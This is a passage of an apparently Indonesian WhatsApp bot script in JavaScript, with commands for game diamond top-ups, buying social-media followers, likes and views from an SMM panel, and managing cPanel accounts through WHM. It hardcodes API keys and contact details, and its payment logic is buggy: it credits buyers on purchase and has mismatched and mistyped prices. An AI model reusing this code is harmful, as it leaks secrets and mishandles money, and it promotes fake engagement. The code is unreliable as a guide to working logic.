if (isNaN(parseInt(produkid))) return m.reply('Jumlah Harus Berupa Angka!')
if (isNaN(parseInt(idml1))) return m.reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(idml2))) return m.reply('Server Harus Berupa Angka!')
let idharga = `UPMBL${produkid}`
if (idharga == "UPMBL5"){
global.hargadmml = 1700
}
if (idharga == "UPMBL12"){
global.hargadmml = 4000
}
if (idharga == "ZIDMBL17"){
global.hargadmml = 4500
}
if (idharga == "UPMBL19"){
global.hargadmml = 7000
}
if (idharga == "UPMBL28"){
global.hargadmml = 13000
}
if (idharga == "UPMBL36"){
global.hargadmml = 21000
}
if (idharga == "UPMBL44"){
global.hargadmml = 15000
}
if (idharga == "UPMBL59"){
global.hargadmml = 18500
    }
if (idharga == "UPMBL74"){
global.hargadmml = 22500
    }
if (idharga == "UPMBL85"){
global.hargadmml = 26500
    }
if (idharga == "UPMBL170"){
global.hargadmml = 51500
    }
if (idharga == "UPMBL185"){
global.hargadmml = 56500
    }
if (idharga == "UPMBL222"){
global.hargadmml = 67500
    }
if (idharga == "UPMBL240"){
global.hargadmml = 72500
    }
if (idharga == "UPMBL296"){
global.hargadmml = 89500
    }
if (idharga == "UPMBL370"){
global.hargadmml = 111500
    }
if (idharga == "UPMBL408"){
global.hargadmml = 123500
    }
if (idharga == "UPMBL568"){
global.hargadmml = 167500
    }
if (idharga == "UPMBL875"){
global.hargadmml = 256500
    }
if (idharga == "UPMBL1159"){
global.hargadmml = 333500
    }
if (idharga == "UPMBL2010"){
global.hargadmml = 555.500
    }
if (idharga == "UPMBL4830"){
global.hargadmml = 1322500
    }
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/merchant/${global.merchant}/cek-username/mobilelegend?user_id=${idml}&signature=${global.signature}`,
  headers: { }
};

axios(config)
.then(function (response) {
let buttons = [
{ buttonId: `topupmlyes ${idml1}|${idml2}|${produkid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },
]
if (response.data.error_msg) {
reply('Invalid Id Or Zone')
}else if (response.data.message) {
liaacans.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*

_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${idml1} (${idml2})_
_》NickName : ${response.data.data.username}_
_》Nama Item : ${produkid} Diamond ( Mlbb )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, liaacans.user.name, m)
} 
})
.catch(function (error) {
  m.reply(error);
});
}
break
case 'topupmlyes':{
if (cekUser("id", m.sender) == null) throw mess.user
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml =`${idml1}${idml2}`
let produkid = `${text.split("|")[2]}`
let refdi = randomNomor(001, 1000)
let refid = `${refdi}`
let idharga = `UPMBL${produkid}`
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=${produkid}&tujuan=${idml}&ref=TRX${refid}`,
  headers: { }
};

axios(config)
.then(function (response) {
if (idharga == "UPMBL5"){
global.hargadmml = 1700
}
if (idharga == "UPMBL12"){
global.hargadmml = 4000
}
if (idharga == "ZIDMBL17"){
global.hargadmml = 4500
}
if (idharga == "UPMBL19"){
global.hargadmml = 7000
}
if (idharga == "UPMBL28"){
global.hargadmml = 13000
}
if (idharga == "UPMBL36"){
global.hargadmml = 21000
}
if (idharga == "UPMBL44"){
global.hargadmml = 15000
}
if (idharga == "UPMBL59"){
global.hargadmml = 18500
    }
if (idharga == "UPMBL74"){
global.hargadmml = 22500
    }
if (idharga == "UPMBL85"){
global.hargadmml = 26500
    }
if (idharga == "UPMBL170"){
global.hargadmml = 51500
    }
if (idharga == "UPMBL185"){
global.hargadmml = 56500
    }
if (idharga == "UPMBL222"){
global.hargadmml = 67500
    }
if (idharga == "UPMBL240"){
global.hargadmml = 72500
    }
if (idharga == "UPMBL296"){
global.hargadmml = 89500
    }
if (idharga == "UPMBL370"){
global.hargadmml = 111500
    }
if (idharga == "UPMBL408"){
global.hargadmml = 123500
    }
if (idharga == "UPMBL568"){
global.hargadmml = 167500
    }
if (idharga == "UPMBL875"){
global.hargadmml = 256500
    }
if (idharga == "UPMBL1159"){
global.hargadmml = 333500
    }
if (idharga == "UPMBL2010"){
global.hargadmml = 555.500
    }
if (idharga == "UPMBL4830"){
global.hargadmml = 1322500
    }
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${global.hargadmml}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${produkid} Diamond ( Mlbb )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda._\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi Saldo User Anda Tidak Akan Dipotong, Harap Tumggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
if (idharga == "UPMBL5"){
moneyAdd(m.sender, 1700)
reply(workid)
}
if (idharga == "UPMBL12"){
moneyAdd(m.sender, 4000)
reply(workid)
}
if (idharga == "ZIDMBL17"){
moneyAdd(m.sender, 4500)
reply(workid)
}
if (idharga == "UPMBL19"){
moneyAdd(m.sender, 7000)
reply(workid)
}
if (idharga == "UPMBL28"){
moneyAdd(m.sender, 10500)
reply(workid)
}
if (idharga == "UPMBL36"){
moneyAdd(m.sender, 13000)
reply(workid)
}
if (idharga == "UPMBL44"){
moneyAdd(m.sender, 15000)
reply(workid)
}
if (idharga == "UPMBL59"){
moneyAdd(m.sender, 18500)
reply(workid)
}
if (idharga == "UPMBL74"){
moneyAdd(m.sender, 22500)
reply(workid)
}
if (idharga == "UPMBL85"){
moneyAdd(m.sender, 26500)
reply(workid)
}
if (idharga == "UPMBL170"){
moneyAdd(m.sender, 51500)
reply(workid)
}
if (idharga == "UPMBL185"){
moneyAdd(m.sender, 56500)
reply(workid)
}
if (idharga == "UPMBL222"){
moneyAdd(m.sender, 67500)
reply(workid)
}
if (idharga == "UPMBL240"){
moneyAdd(m.sender, 72500)
reply(workid)
}
if (idharga == "UPMBL296"){
moneyAdd(m.sender, 89500)
reply(workid)
}
if (idharga == "UPMBL370"){
moneyAdd(m.sender, 111500)
reply(workid)
}
if (idharga == "UPMBL408"){
moneyAdd(m.sender, 123500)
reply(workid)
}
if (idharga == "UPMBL568"){
moneyAdd(m.sender, 167500)
reply(workid)
}
if (idharga == "UPMBL875"){
moneyAdd(m.sender, 256500)
reply(workid)
}
if (idharga == "UPMBL1159"){
moneyAdd(m.sender, 333500)
reply(workid)
}
if (idharga == "UPMBL2010"){
moneyAdd(m.sender, 555.500)
reply(workid)
}
if (idharga == "UPMBL4830"){
moneyAdd(m.sender, 1322500)
reply(workid)
}
} else if(response.data.data.status == "Gagal"){
reply(workd)
}
})
break
}
case 'topupml2':{
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml = `${idml1}${idml2}`
let produkid = text.split("|")[2]
if (isNaN(parseInt(produkid))) return m.reply('Jumlah Harus Berupa Angka!')
if (isNaN(parseInt(idml1))) return m.reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(idml2))) return m.reply('Server Harus Berupa Angka!')
let idharga = `ZIDMBL${produkid}`
if (idharga == "ZIDMBL17"){
global.hargadmml = 4500
}
if (idharga == "ZIDMBL34"){
global.hargadmml = 9000
}
if (idharga == "ZIDMBL50"){
global.hargadmml = 13500
}
if (idharga == "ZIDMBL66"){
global.hargadmml = 18000
}
if (idharga == "ZIDMBL74"){
global.hargadmml = 20000
}
if (idharga == "ZIDMBL83"){
global.hargadmml = 22500
    }
if (idharga == "ZIDMBL184"){
global.hargadmml = 50000
    }
if (idharga == "ZIDMBL366"){
global.hargadmml = 100000
    }
if (idharga == "ZIDMBL758"){
global.hargadmml = 200000
    }
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/merchant/${global.merchant}/cek-username/mobilelegend?user_id=${idml}&signature=${global.signature}`,
  headers: { }
};

axios(config)
.then(function (response) {
let buttons = [
{ buttonId: prefix+`topupml2yes ${idml1}|${idml2}|${produkid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },
]
if (response.data.error_msg) {
m.reply('Invalid Id Or Zone')
}else if (response.data.message) {
liaacans.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*

_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${idml1} (${idml2})_
_》NickName : ${response.data.data.username}_
_》Nama Item : ${produkid} Diamond ( Mlbb )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, liaacans.user.name, m)
} 
})
.catch(function (error) {
  m.reply(error);
});
}
break
case 'topupml2yes':{
if (cekUser("id", m.sender) == null) throw mess.user
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml =`${idml1}${idml2}`
let produkid = `${text.split("|")[2]}`
let refdi = randomNomor(001, 1000)
let refid = `${refdi}`
let idharga = `ZIDMBL${produkid}`
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=${produkid}&tujuan=${idml}&ref=TRX${refid}`,
  headers: { }
};

axios(config)
.then(function (response) {
if (idharga == "ZIDMBL17"){
global.hargadmml = 4500
}
if (idharga == "ZIDMBL34"){
global.hargadmml = 9000
}
if (idharga == "ZIDMBL50"){
global.hargadmml = 13500
}
if (idharga == "ZIDMBL66"){
global.hargadmml = 18000
}
if (idharga == "ZIDMBL74"){
global.hargadmml = 20000
}
if (idharga == "ZIDMBL83"){
global.hargadmml = 22500
    }
if (idharga == "ZIDMBL184"){
global.hargadmml = 50000
    }
if (idharga == "ZIDMBL366"){
global.hargadmml = 100000
    }
if (idharga == "ZIDMBL758"){
global.hargadmml = 200000
    }
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${global.hargadmml}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${produkid} Diamond ( Mlbb )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda._\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi Saldo User Anda Tidak Akan Dipotong, Harap Tumggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
if (idharga == "ZIDMBL17"){
moneyAdd(m.sender, 4500)
m.reply(workid)
}
if (idharga == "ZIDMBL34"){
moneyAdd(m.sender, 9000)
m.reply(workid)
}
if (idharga == "ZIDMBL50"){
moneyAdd(m.sender, 13500)
m.reply(workid)
}
if (idharga == "ZIDMBL66"){
moneyAdd(m.sender, 18000)
m.reply(workid)
}
if (idharga == "ZIDMBL74"){
moneyAdd(m.sender, 20000)
m.reply(workid)
}
if (idharga == "ZIDMBL83"){
moneyAdd(m.sender, 22500)
m.reply(workid)
}
if (idharga == "ZIDMBL184"){
moneyAdd(m.sender, 50000)
m.reply(workid)
}
if (idharga == "ZIDMBL366"){
moneyAdd(m.sender, 100000)
m.reply(workid)
}
if (idharga == "ZIDMBL758"){
moneyAdd(m.sender, 200000)
m.reply(workid)
}
} else if(response.data.data.status == "Gagal"){
m.reply(workd)
}
})
break
}
case 'listdmff2':
if (cekUser("id", m.sender) == null) throw mess.user
let topupp = `*── 「 DIAMOND FREE FIRE 」 ──*

_》5 Diamond : Rp1.261_
_》12 Diamond : Rp2.523_
_》70 Diamond : Rp12.614_
_》140 Diamond : Rp25.227_
_》355 Diamond : Rp63.068_
_》720 Diamond : Rp126.136_
_》1450 Diamond : Rp252.273_

Cara Pembelian:
${prefix}topupff2 ID|JUMLAH DIAMOND
Contoh:
${prefix}topupff2 123456789|1450

NOTE: Pembelian Akan Diproses Oleh Sistem Otomatis Ketika Anda Telah Melakukan Pembayaran Dan Diamond Akan Segera Masuk.
`
m.reply(topupp)
break
case 'topupff2':{
if (cekUser("id", m.sender) == null) throw mess.user
let idff = text.split("|")[0]
let totaldm = text.split("|")[1]
let nopemu = m.sender.replace("@s.whatsapp.net", "")
var baseURL = "https://duniagames.co.id";
var axios = require('axios');
axios.get(`https://api.lolhuman.xyz/api/freefire/${idff}?apikey=Imanmpa`)
            .then(({data}) => {
m.reply('Tunggu Sebentar Kak, ImanBot Akan Cek Id Kakak')
            })
            .catch((err) => {
                m.reply('Id Atau NickName Tidak Ditemukan!')
            })
const topup = async(userId, zoneId, diamond, phone, game) => {
  if (!userId || !diamond || !phone || !game) return new Error();
  let cookie = await getCookie(baseURL);
  if (!cookie) return new Error("empty cookies");
  let res = await axios.post(`https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store?${getVal(diamond, game.toUpperCase())}&gameId=${userId}&product_ref=REG&product_ref_denom=AE`, null, {
    "headers": { 
      "cookie": cookie.join(" "),
      "origin": baseURL,
      "referer": baseURL
    }
  })
  if (res.status != 200) throw new Error(res.statusText);
  let res2 = await axios.post(`https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/store?inquiryId=${res.data.data.inquiryId}&phoneNumber=${phone}&transactionId=${res.data.data.transactionId}`, null, {
    "headers": { 
      "cookie": cookie.join(" "),
      "origin": baseURL,
      "referer": baseURL
    }
  })
if (res2.status != 200) throw new Error(res2.statusText);
let suksess = `*── 「 TOPUP OTOMATIS 」 ──*
                
_Silahkan Scan Qris Dan Transfer Sesuai Harga:_
_》Harga : Rp${res2.data.data.totalPrice}_
_》NickName : ${res2.data.data.userGameName}_
_》Nama Item : ${res.data.data.item.name} ( FreeFire )_
_》Code Trx : ${res2.data.data.transactionCode}_

_Qr Scan Berlaku 5 Menit, Setelah 5 Menit Pesan Ini Akan Dihapus!._  

_Note: Diamond Akan Otomatis Masuk Dalam 2-3 Menit Setelah Pembayaran Berhasil._`
let kirimk = await liaacans.sendMessage(m.chat, { image: { url: res2.data.data.elisaConfig.qrCode }, caption: `${suksess}` }, { quoted: m })
setTimeout(() => {
liaacans.sendMessage(m.chat, { delete:kirimk.key })
}, 500000)
}
const getCookie = async(...args) => (await axios(...args)).headers["set-cookie"];
function getVal(dm, game) {
  let list = JSON.parse(fs.readFileSync("./json/duniagames.json"))
  if (!list[game]) return new Error("no game for '" + game + "'")
  return new URLSearchParams(list[game][dm]).toString();
}
let shop = await topup(`${idff}`, null, `${totaldm}`, `${nopemu}`, "freefire")
break
}
case 'rules':
             rulesBot = `# RULES BOT

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

4. Gpp sc gw jelek yg penting 
Bot gw jalan awokawoak
Jika sudah dipahami rules-nya, silakan ketik *#menu* untuk memulai!

Owner  BOTZ:
wa.me/6288223674569
`
             m.reply(rulesBot)
             break
case 'order':
			case 'caraorder': {
			if (cekUser("id", m.sender) == null) throw mess.user
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				let capp = `*Hallo _${m.pushName}_ Berikut Cara Order*\n\n*Followers :*\nex1 : _${prefix}followers jumlah|target [ tanpa (@) ]_\nex2 : _${prefix}followers 500|auliarahman_ckep___\n\n*View :*\nex 1 : _${prefix}view jumlah|link_\nex 2 : _${prefix}view 10000|https://vm.tiktok.com/xxxxxxx_\n\n*Like :*\nex 1 : _${prefix}like jumlah|link_\nex 2 : _${prefix}like 10000|https://www.instagram.com/p/xxxxxxx_\n\nSekian penjelasan cara order\nSemoga anda faham dengan penjelasan ini🙏\nbeli = faham`
				liaacans.sendMessage(m.chat, {text: capp}, {quoted:m})
				}
				break
          /*case 'followers': case 'follower': { // Fix Aja Kalau Bisa
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`Link atau Usernamenya mana?`)
				let juma = q.split('|')[0] ? q.split('|')[0]: q
				let targtt = q.split('|')[1] ? q.split('|')[1]: ''
				if (targtt.length < 1) return m.reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|auliarahman_ckep`)

				let fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=aryamanik&action=pricelist&type=follower`)
				list = []
				textplus = `${juma}|${targtt}`
            for (let L of fetaa.data) {
                list.push({
                        title: `*${L.nama}*`,
    					rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
    					description: `\n${L.desc}`
                    })
                }
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: "© Created By Kizu-MD",
  buttonText: "Click Here!",
  sections: [{
                    title: "Sosmed Store",
  				rows: list
                }],
                listType: 1
}

const sendMsg = await liaacans.sendMessage(m.chat, listMessage)
               break
					}
					
			case 'like':{ // Fix Aja Klau Bisa
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`Link atau Usernamenya mana?`)
				let jumlahhh = q.split('|')[0] ? q.split('|')[0]: q
				let targettt = q.split('|')[1] ? q.split('|')[1]: ''
				if (targettt.length < 1) return m.reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|auliarahman_ckep`)

				fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=aryamanik&action=pricelist&type=like`)
				list = []
				textplus = `${jumlahhh}|${targettt}`
            for (let L of fetaa.data) {
                list.push({
                        title: `*${L.nama}*`,
    					rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
    					description: `\n${L.desc}`
                    })
                }
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: "© Created By Kizu-MD",
  buttonText: "Click Here!",
  sections: [{
                    title: "Sosmed Store",
  				rows: list
                }],
                listType: 1
}

const sendMsg = await liaacans.sendMessage(m.chat, listMessage)
				}
				break
case 'view': { // Fix Aja Kalau Bisa
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`Link atau Usernamenya mana?`)
				let jumlahh = q.split('|')[0] ? q.split('|')[0]: q
				let targett = q.split('|')[1] ? q.split('|')[1]: ''
				if (targett.length < 1) return m.reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|auliarahman_ckep`)

				let anu = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=aryamanik&action=pricelist&type=view`)
				list = []
				textplus = `${jumlahh}|${targett}`
            for (let L of anu.results) {
                list.push({
                        title: `*${L.nama}*`,
    					rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
    					description: `\n${L.desc}`
                    })
                }
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: "© Created By Kizu-MD",
  buttonText: "Click Here!",
  sections: [{
                    title: "Sosmed Store",
  				rows: list
                }],
                listType: 1
}

const sendMsg = await liaacans.sendMessage(m.chat, listMessage)
				break
}
case 'confirmorderkunci': { //KUNCI = BIAR GA DIAKSES HEHE
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`*Cara order followers*\n\n*Example :* _${command} jumlah|username tanpa (@)_\n*Example :* _${command} 500|auliarahman_ckep\n\n*Min pesan :* _300_ \n*Max pesan :* _500k_\n\nThank You`)
				let jumlah = q.split('|')[0] ? q.split('|')[0]: q
				let targ = q.split('|')[1] ? q.split('|')[1]: ''
				let idny = q.split('|')[2] ? q.split('|')[2]: ''

				feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=aryamanik&action=order&quantity=${jumlah}&target=${targ}&id_layanan=${idny}`)
				if (feta.status == false) {
  				m.reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${feta.data.msg} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
				} else {
  				let idpes = feta.data.order_id
  				let cap = `Hay *${pushname} 👋,* Terimakasih Telah Order di Sosmed Shop!\nScan QR diatas untuk membayar! MENGGUNAKAN QRIS.\n\n*Id Pesanan Anda :* ${feta.data.order_id}\n*Target :* ${targ}\n*Jumlah Pesanan :* ${jumlah}\n*Total Harga Pesanan :* Rp ${feta.data.amount}\n*Status Orderan :* ${feta.data.status}\n\n_Info lebih lanjut klik button dibawah._`
  				buto = [{
    				buttonId: `cekstatus ${feta.data.order_id}`,
    				buttonText: {
      				displayText: 'Check Status'
    				},
    				type: 1
  				}]
  				liaacans.sendMessage(m.chat, {
    				caption: cap, image: {
      				url: feta.data.qris
    				}, buttons: buto, footer: `©Created LiaaCans BOT`
  				})
				}
				console.log(feta)
				}
				break
case 'listharga':
			case 'prichlist':
			case 'pricelist': {
				feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=aryamanik&action=pricelist&type=semua`)
				list = '*List Harga Layanan*\n\n'
				for (let L of anu.results) {
 				 list += `name : ${L.nama}\ndesc : ${L.desc}\nmin : ${L.min}\nmax : ${L.max}\nharga : ${L.price}\nid : ${L.id_layanan}\n\n`
				}
				liaacans.sendMessage(m.chat, {text: list}, {quoted:m})
				console.log(feta)
				}
				break*/
case 'chekstatus':
			case 'cekstatus': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply('idnya mana bang')
				seta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=aryamanik&action=status&order_id=${q}`)
				//console.log(seta)
				if (seta.status == false) {
  				var captionnye = `\nid order tidak di temukan`
				} else {
  				var captionnye = `\n*Status Orderan Anda*\n\nTarget : ${seta.data.target}\nStatus : ${seta.data.status}\nFollowers Default : ${seta.data.start_count}\nOn Process : ${seta.data.kurang}\nTotal Order : ${seta.data.total_order}\nTanggal Pesan : ${seta.data.tanggal_pesan}\nJumlah Pembayaran : ${seta.data.amount}\nId Pesanan : ${seta.data.order_id}\n\nTerimakasih sudah membeli followers dari kami, ditunggu next ordernya!`
				}
				var copynye = `${q}`
				const menuButa = [{
  				index: 1,
  				urlButton: {
    				displayText: `Copy Id Here`,
    				url: 'https://www.whatsapp.com/otp/copy/'+copynye
  				}},
				{urlButton: {
    				displayText: `Panel Smm`,
    				url: 'https://ampibismm.my.id'
  				}},
  				{
    				quickReplyButton: {
      				displayText: `Check Status Again`,
      			id: `cekstatus ${q}`
    				}
  				},
				]
				await liaacans.sendMessage(m.chat, {
  				text: `${captionnye}`, templateButtons: menuButa, footer: `Copy id pesanan anda dibawah ini\n\nampibismm.my.id\n©LiaaCansBot`
				}, {
  				quoted: m
				})
				}
				break
case 'createcp': // FIX AJA KLAU BISA
if (!isCreator) throw mess.owner
if (!q) return m.reply(`*CREATECP ACCOUNT*\nExample:\n#${command} domain|package\n\nContoh:\n#${command} liaacansapi.com|liaacans`)
let usern = `USER${makeid(6)}`
let domain = q.split('|')[0] 
let pekeg = q.split('|')[1]
if (!domain) return m.reply('Domain wajib di isi!!')
if (!pekeg) return m.reply('Package Wajib di isi!!')
m.reply('Creating please wait... ⏳')
fetchJson(`https://${hostwhm}:2087/json-api/createacct?api.version=1&username=${usern}&contactemail=auliahostweb@gmail.com&plan=${pekeg}&domain=${domain}`, authWhm).then(response => {     
let np = response.data
if (np.metadata.result == 0) {
m.reply(np.metadata.reason)
} else {
let dsta = np.metadata.output.raw;
var substr = dsta.substring(
dsta.toString().indexOf("+===================================+")
);
let xxybot = substr.split("| Language: en")[0];
m.reply(`${xxybot}\n\nLogin : https://${hostwhm}:2087`)
}});
break
case 'listcp': // FIX AJA KALAU BISA
if (!isCreator) throw mess.owner
m.reply('Wait Getting List Account info....')
fetchJson(`https://${hostwhm}:2087/json-api/listaccts?api.version=1`, authWhm)
.then((risol) => {
let lisol = risol.data
var ttdy = lisol.data.acct
let ogh = `*── 「 LIST CPANEL 」 ──*\nTotal Akun : ${ttdy.length}\n`
for (let i = 0; i < ttdy.length; i++) {
ogh += `
\n
─────[\`\`\` ${ttdy[i].user} \`\`\` ]────────
*▢ Maxsub* : ${ttdy[i].maxsub}
*▢ Maxsql* : ${ttdy[i].maxsql}
*▢ Startdate* : ${ttdy[i].startdate}
*▢ Disklimit* : ${ttdy[i].disklimit}
*▢ Maxlst* : ${ttdy[i].maxlst}
*▢ Plan* : ${ttdy[i].plan}
*▢ Owner*: ${ttdy[i].owner}
*▢ IP* : ${ttdy[i].ip}
*▢ Domain* : ${ttdy[i].domain}
*▢ Diskused* : ${ttdy[i].diskused}
*▢ Maxaddons* : ${ttdy[i].maxaddons}
*▢ Suspendreason* : ${ttdy[i].suspendreason}
─────────────────\n\n`
}
m.reply(ogh)
})
break
case 'terminate': // FIX AJA KLAU BISA
if (!isCreator) throw mess.owner
if (args.length < 2) return reply(`Kirim perintah #${command} username`)
m.reply('Wait Terminating Account....')
fetchJson(`https://${hostwhm}:2087/json-api/removeacct?api.version=1&username=${args[1]}`, authWhm )
.then((e) => {
if ([1, "1"].includes(e.data?.metadata?.result))
m.reply(`Done User ${q} Telah di Terminate`);
else {
m.reply(e.metadata);
console.log(e.data);
}
})
break
//------------------< Premium >-------------------
       /*case 'premium': case 'addprem':  // Fix Aja Klau Bisaa
              if (!q) return m.reply(`Command : ${prefix}addprem @user 9day`)
              if (!isCreator) throw mess.owner
              if (args[1] === 'add') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
              premium.addPremiumUser(mentioned[0], args[3], _premium)
              m.reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[3])).days} day(s) ${ms(toMs(args[3])).hours} hour(s) ${ms(toMs(args[3])).minutes} minute(s)`)
        
              } else {
            
              premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[3], _premium)
              m.reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[3])).days} day(s) ${ms(toMs(args[3])).hours} hour(s) ${ms(toMs(args[3])).minutes} minute(s)`)
}
              } else if (args[1] === 'del') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            _premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
              fs.writeFileSync('./json/premium.json', JSON.stringify(_premium))
              m.reply('Sukses')
              } else {
            _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
              fs.writeFileSync('./json/premium.json', JSON.stringify(_premium))
              m.reply('Sukses')
}
              } else {
              m.reply(mess.wrongFormat)
}
              break
       case 'premiumcheck':
       case 'cekpremium': 
              if (!isPremium) throw `Maaf Ini Khusus Premium`
              const cekExp = ms(await premium.getPremiumExpired(m.sender, _premium) - Date.now())
              m.reply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
              break
       case 'listprem':
       case 'listpremium':          
              let txt = `「 *PREMIUM USER LIST* 」\n\n`
              let men = [];
              for (let i of _premium){
              men.push(i.id)
              const checkExp = ms(i.expired - Date.now())
              txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
}
              //liaacans.sendTextWithMentions(txt, men, true)
              m.reply(txt)
              break
*/
        // Menu Store
        case 'item':
        if (cekUser("id", m.sender) == null) throw mess.user
                    if (!m.isGroup) throw `Perintah Ini Khusus Untuk Grup`
            if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
            if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
            var arr_rows = [];
            for (let x of db_respon_list) {
                if (x.id === m.chat) {
                    arr_rows.push({
                        title: x.key,
                        rowId: x.key
                    })
                }
            }
const listMessage = {
  text: `${pushname} 👋\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!\n🕰 Jam : ${moment().format("HH:mm:ss z")} `,
  footer: "© Created By Kizu-MD",
  buttonText: "Click Here!",
  sections: [{
                    title: groupName, rows: arr_rows
                }],
                listType: 1
}

const sendMsg = await liaacans.sendMessage(m.chat, listMessage)
               break
        
        case 'additem':
        if (cekUser("id", m.sender) == null) throw mess.user
            if (!m.isGroup) throw `Perintah Ini Khusus Untuk Grup`
            if (!isAdmins && !isCreator) return m.reply('Only Admins')
            var args1 = text.split("@")[0]
            var args2 = text.split("@")[1]                
            if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml@List`)
